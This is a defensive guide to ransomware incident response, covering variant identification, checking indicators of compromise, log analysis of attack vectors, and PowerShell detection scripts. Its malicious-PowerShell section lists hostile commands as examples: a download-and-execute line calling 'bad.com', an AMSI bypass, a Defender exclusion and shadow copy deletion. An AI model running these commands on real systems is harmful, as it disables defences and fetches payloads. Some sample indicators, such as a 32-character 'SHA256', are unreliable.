Threat Intelligence Gathering in Ransomware Incidents
RANSOMWARE VARIANT IDENTIFICATION
1. Examine File Extensions
Why Extensions Matter:
File extensions are often the first and quickest indicator of which ransomware family you're dealing with. Each group typically uses unique extensions as their "signature."
Common Extension Patterns:
Original file: invoice.pdf
After encryption: 

- LockBit 3.0: invoice.pdf.lockbit
- BlackCat: invoice.pdf.kjhgf654 (random 7 chars)
- Conti: invoice.pdf.CONTI
- Royal: invoice.pdf.royal
- Akira: invoice.pdf.akira
- Black Basta: invoice.pdf.basta
- Hive: invoice.pdf.hive
- CryptoLocker: invoice.pdf.encrypted
Advanced Extension Analysis:
powershell# PowerShell script to analyze encrypted file patterns
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
Where-Object { $_.Extension -match '\.(locked|encrypted|[a-z0-9]{5,8})$' } |
Group-Object Extension |
Select-Object Count, Name |
Sort-Object Count -Descending

# Output example:
# Count  Name
# -----  ----
# 15823  .lockbit
# 8291   .kjhgf654
# 102    .readme
Multi-Extension Variants:
Some ransomware adds multiple extensions:
document.docx → document.docx.id-[victim_id].[contact_email].dharma
spreadsheet.xlsx → spreadsheet.xlsx.[[email]].arena
No-Extension Variants:
Some sophisticated variants don't change extensions but modify file headers:
bash# Check file headers for encryption markers
hexdump -C suspicious_file.pdf | head -n 5
# Look for non-standard PDF header (should start with %PDF)
2. Review Ransom Note for Group Indicators
Ransom Note Locations and Names:
LockBit:
- Filename: LockBit_README.txt
- Location: Every encrypted directory
- Wallpaper: Changed to ransom message

BlackCat/ALPHV:
- Filename: RECOVER-[random]-FILES.txt
- Location: Desktop and root directories
- Contains: Unique victim URL on TOR

Conti:
- Filename: readme.txt
- Location: All directories
- Language: Professional, business-like tone

Royal:
- Filename: README.TXT
- Location: Each folder with encrypted files
- Special: Contains direct contact via TOR chat

Clop:
- Filename: ClopReadMe.txt
- Special: Often includes leaked data preview links
Analyzing Ransom Note Content:
python# Python script to extract indicators from ransom notes
import re

def analyze_ransom_note(note_content):
    indicators = {
        'bitcoin_addresses': re.findall(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}', note_content),
        'monero_addresses': re.findall(r'4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}', note_content),
        'email_addresses': re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', note_content),
        'tor_urls': re.findall(r'[a-z0-9]{16,56}\.onion', note_content),
        'telegram_contacts': re.findall(r'@[\w]+', note_content),
        'victim_ids': re.findall(r'ID:?\s*([A-Z0-9]{8,32})', note_content)
    }
    return indicators

# Example output:
# {
#   'bitcoin_addresses': ['1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'],
#   'tor_urls': ['payment43u5hgkeld3.onion'],
#   'victim_ids': ['CLIENT045-2024']
# }
Language and Psychological Profiling:
Professional Groups (likely RaaS):
- Proper grammar and spelling
- Business terminology
- "Customer service" approach
- Example: "Dear Client, Your network has been encrypted..."

Amateur/Script Kiddies:
- Poor grammar, multiple languages mixed
- Threatening tone
- Unrealistic deadlines
- Example: "PAY NOW OR FILES GONE FOREVER!!! 24 HOURS!!!"

Nation-State Adjacent:
- Political messaging
- Specific targeting references
- May not request payment
3. Check IoCs Against Threat Intelligence Feeds
Key IoC Types to Check:
yamlFile Hashes:
  - SHA256: 5f4dcc3b5aa765d61d8327deb882cf99 (ransomware executable)
  - MD5: obsolete but still in some feeds
  - Import Hash: 8f4e3c5b2a1d9e7f6c4b8a2e (for variant clustering)

Network Indicators:
  - C2 Domains: secure-update[.]net, payment-verify[.]com
  - IP Addresses: 185.220.101.45, 91.242.217.88
  - URLs: http://185.220.101.45/gate/client.php
  - User-Agents: "Mozilla/5.0 (Ransomware Bot v2.1)"

Registry Keys:
  - HKLM\SOFTWARE\Classes\mscfile\shell\open\command
  - HKCU\Software\[RandomName]\
  
Mutexes:
  - Global\LockBitMutex2024
  - Local\ContiRunning

File Paths:
  - C:\ProgramData\[random]\update.exe
  - %APPDATA%\Microsoft\[random].dll
Threat Intelligence Feed Sources:
python# Example API integration for threat intelligence
import requests

def check_ioc_reputation(ioc_value, ioc_type):
    # VirusTotal API
    vt_url = f"https://www.virustotal.com/api/v3/{ioc_type}s/{ioc_value}"
    headers = {"x-apikey": "YOUR_API_KEY"}
    vt_response = requests.get(vt_url, headers=headers)
    
    # AlienVault OTX
    otx_url = f"https://otx.alienvault.com/api/v1/indicators/{ioc_type}/{ioc_value}"
    otx_response = requests.get(otx_url)
    
    # Abuse.ch Ransomware Tracker
    abuse_url = "https://ransomwaretracker.abuse.ch/api/"
    abuse_data = {"ioc": ioc_value}
    abuse_response = requests.post(abuse_url, data=abuse_data)
    
    return {
        "virustotal": vt_response.json(),
        "alienvault": otx_response.json(),
        "abuse_ch": abuse_response.json()
    }
MITRE ATT&CK Mapping:
LockBit 3.0 TTPs:
- T1486: Data Encrypted for Impact
- T1490: Inhibit System Recovery
- T1047: Windows Management Instrumentation
- T1055: Process Injection
- T1070: Indicator Removal on Host

BlackCat TTPs:
- T1486: Data Encrypted for Impact
- T1027: Obfuscated Files or Information
- T1140: Deobfuscate/Decode Files
- T1083: File and Directory Discovery
- T1057: Process Discovery
4. Identify Encryption Methodology
Common Encryption Schemes:
AES + RSA Hybrid (Most Common):
- Files encrypted with AES-256 (symmetric)
- AES key encrypted with RSA-2048/4096 (asymmetric)
- Example: LockBit, Conti, REvil

ChaCha20 + RSA:
- Faster than AES on systems without AES-NI
- Example: Black Basta, Maze

Custom Cryptography (Dangerous):
- Poorly implemented custom algorithms
- May be breakable
- Example: Some ransomware variants from 2020-2021

Intermittent Encryption:
- Only encrypts parts of files for speed
- Example: BlackCat's "SmartPattern" mode
Analyzing Encryption Patterns:
python# Check if file is fully or partially encrypted
def analyze_encryption_pattern(original_file, encrypted_file):
    with open(original_file, 'rb') as f1, open(encrypted_file, 'rb') as f2:
        original = f1.read()
        encrypted = f2.read()
        
        # Check for partial encryption
        block_size = 1024
        encrypted_blocks = 0
        total_blocks = len(original) // block_size
        
        for i in range(0, len(original), block_size):
            if original[i:i+block_size] != encrypted[i:i+block_size]:
                encrypted_blocks += 1
        
        encryption_percentage = (encrypted_blocks / total_blocks) * 100
        
        if encryption_percentage < 100:
            return f"Intermittent encryption: {encryption_percentage:.2f}%"
        else:
            return "Full file encryption"
ATTACK VECTOR ANALYSIS
1. Review Email Gateway Logs (Last 72 Hours)
What to Look For:
sql-- SQL query for email gateway analysis
SELECT 
    sender_address,
    recipient_address,
    subject,
    attachment_names,
    attachment_hashes,
    timestamp,
    action_taken
FROM email_logs
WHERE 
    timestamp >= NOW() - INTERVAL 72 HOUR
    AND (
        attachment_names LIKE '%.zip' 
        OR attachment_names LIKE '%.rar'
        OR attachment_names LIKE '%.iso'
        OR attachment_names LIKE '%.img'
        OR attachment_names LIKE '%.docm'
        OR attachment_names LIKE '%.xlsm'
        OR subject REGEXP '(invoice|payment|urgent|resume|cv|scan)'
    )
ORDER BY timestamp DESC;
Common Email-Based Attack Patterns:
Thread Hijacking Example:
- Original thread: "RE: Q3 Budget Review"
- Hijacked reply: "RE: Q3 Budget Review - Please review attached"
- Attachment: Budget_Q3_Final.zip (contains .exe)

Fake Invoice Campaign:
Subject: Invoice #INV-2024-8934 Overdue
Body: "Please find attached invoice. Payment required within 24 hours."
Attachment: Invoice_8934.pdf.exe (double extension)

HR Targeted Attack:
Subject: Resume - Senior Developer Position
Body: "Please find my resume attached for the open position."
Attachment: Resume_John_Smith.iso (contains malware)
Analyzing Malicious Attachments:
bash# Extract and analyze suspicious attachments
# For ZIP files
unzip -l suspicious.zip
# Check for nested archives, executables, or scripts

# For ISO/IMG files
7z l suspicious.iso
# Look for LNK files, scripts, or executables

# For Office documents with macros
olevba suspicious.docm
# Analyze macro code for:
# - PowerShell execution
# - WScript.Shell
# - Downloaded content
# - Base64 encoded strings
2. Check for Exposed RDP Ports (3389)
External Exposure Assessment:
bash# Check from external network
nmap -p 3389 -sV public_ip_range/24

# Check for weak RDP configurations
nmap --script rdp-enum-encryption -p 3389 target_ip

# Look for RDP honeypot indicators
nmap --script rdp-ntlm-info -p 3389 target_ip
RDP Log Analysis:
powershell# Windows Event Log queries for RDP activity
# Successful RDP logins
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | 
Where-Object {$_.Message -match "Type 10"} |
Select-Object TimeCreated, Message

# Failed RDP attempts (brute force indicator)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} |
Where-Object {$_.Message -match "Type 10"} |
Group-Object -Property {$_.Properties[5].Value} |
Where-Object {$_.Count -gt 10}

# RDP session reconnections
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TerminalServices-LocalSessionManager/Operational';ID=25}
Common RDP Attack Patterns:
Brute Force Indicators:
- Multiple failed logins followed by success
- Logins from unusual geographic locations
- Off-hours access patterns
- Use of generic usernames (admin, administrator, user)

Post-Compromise RDP Indicators:
- New local admin accounts created
- RDP settings modified (fDenyTSConnections)
- Firewall rules added for RDP
- Sticky Keys backdoor (sethc.exe replaced)
3. Analyze VPN Access Logs
VPN Log Critical Events:
python# Parse VPN logs for suspicious patterns
def analyze_vpn_logs(log_file):
    suspicious_patterns = {
        'impossible_travel': [],  # Login from multiple countries quickly
        'expired_accounts': [],    # Access with disabled accounts
        'unusual_hours': [],       # Access outside business hours
        'suspicious_clients': [],  # Non-standard VPN clients
        'concurrent_sessions': []  # Same user, multiple locations
    }
    
    # Example detection logic
    for log_entry in parse_logs(log_file):
        # Check for impossible travel
        if user_traveled_impossibly_fast(log_entry):
            suspicious_patterns['impossible_travel'].append(log_entry)
        
        # Check for unusual VPN client strings
        if log_entry.client_string not in approved_clients:
            suspicious_patterns['suspicious_clients'].append(log_entry)
    
    return suspicious_patterns
VPN Vulnerability Indicators:
Fortinet FortiGate (CVE-2024-21762):
- Log pattern: "SSL VPN negotiation error"
- Unauthorized file access to /dev/shm/
- New admin accounts without audit trail

Pulse Secure (CVE-2024-XXXX):
- Unusual entries in /log/events.log
- Modified template files in /custom/
- Presence of webshells in /custom/templating/

Cisco AnyConnect:
- Memory corruption indicators in crash dumps
- Unusual DLL loads in event logs
- Modified host checker policies
4. Examine Recent Software Installations
Windows Software Installation Audit:
powershell# Get recently installed software (last 7 days)
Get-WmiObject -Class Win32_Product |
Where-Object {$_.InstallDate -gt (Get-Date).AddDays(-7)} |
Select-Object Name, Vendor, InstallDate, InstallLocation

# Check for suspicious MSI installations
Get-WinEvent -LogName "Application" |
Where-Object {$_.ProviderName -eq "MsiInstaller" -and $_.TimeCreated -gt (Get-Date).AddDays(-3)}

# Review scheduled task creation
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4698} |
Select-Object TimeCreated, Message

# Check for new services
Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} |
Select-Object TimeCreated, Message
Common Malicious Software Patterns:
Legitimate Tools Abused:
- TeamViewer (unattended access)
- AnyDesk (persistent remote access)
- PsExec (lateral movement)
- Mimikatz (credential dumping)
- Advanced IP Scanner (network reconnaissance)

Fake Software Packages:
- "Adobe_Flash_Update.exe" (Flash is EOL)
- "ChromeUpdate.msi" (Chrome auto-updates)
- "JavaUpdate.exe" (outside official channels)
- "WindowsDefenderUpdate.exe" (fake AV)
5. Review PowerShell Execution History
PowerShell Logging Analysis:
powershell# Enable PowerShell logging if not already enabled
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Query PowerShell operational logs
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=4104} |
Select-Object -First 100 |
ForEach-Object {
    $_.Message
} | Select-String -Pattern "(IEX|Invoke-Expression|DownloadString|EncodedCommand|FromBase64String)"

# Check for encoded commands
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell';ID=400,403,600} |
Where-Object {$_.Message -match "HostApplication.*powershell.*-enc"}
Malicious PowerShell Patterns:
powershell# Common ransomware PowerShell techniques

# 1. Base64 encoded commands
powershell.exe -NoP -NonI -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAEQA...

# 2. Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://bad.com/payload.ps1')

# 3. Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File malicious.ps1

# 4. AMSI bypass attempts
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 5. Defender exclusion additions
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# 6. Shadow copy deletion
vssadmin delete shadows /all /quiet

# 7. Memory injection
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, $buf.Length)
Advanced PowerShell Detection:
python# Python script to detect obfuscated PowerShell
import re
import base64

def detect_powershell_obfuscation(script_content):
    indicators = {
        'base64': bool(re.search(r'[A-Za-z0-9+/]{50,}={0,2}', script_content)),
        'string_concatenation': script_content.count('+') > 20,
        'backticks': script_content.count('`') > 5,
        'format_operator': bool(re.search(r'-f\s*["\']', script_content)),
        'replace_method': bool(re.search(r'\.replace\(["\']', script_content, re.I)),
        'char_array': bool(re.search(r'\[char\[\]\]', script_content)),
        'byte_array': bool(re.search(r'\[byte\[\]\]', script_content)),
        'compression': bool(re.search(r'IO\.Compression', script_content)),
        'reflection': bool(re.search(r'Reflection\.Assembly', script_content))
    }
    
    risk_score = sum(indicators.values()) * 10
    return risk_score, indicators

# Deobfuscation example
def deobfuscate_base64(encoded_string):
    try:
        decoded = base64.b64decode(encoded_string)
        return decoded.decode('utf-16-le')  # PowerShell often uses UTF-16
    except:
        return None
Putting It All Together: Integrated Analysis Workflow
python# Comprehensive threat intelligence gathering script
class RansomwareIntelligenceGathering:
    def __init__(self):
        self.findings = {
            'variant': None,
            'attack_vector': None,
            'patient_zero': None,
            'timeline': [],
            'iocs': []
        }
    
    def analyze_infection(self):
        # Step 1: Identify variant
        self.findings['variant'] = self.identify_ransomware_variant()
        
        # Step 2: Determine attack vector
        email_iocs = self.check_email_logs()
        rdp_iocs = self.check_rdp_exposure()
        vpn_iocs = self.analyze_vpn_logs()
        
        # Step 3: Find patient zero
        self.findings['patient_zero'] = self.trace_initial_infection()
        
        # Step 4: Build timeline
        self.findings['timeline'] = self.construct_attack_timeline()
        
        # Step 5: Extract all IOCs
        self.findings['iocs'] = self.extract_all_iocs()
        
        return self.generate_intelligence_report()
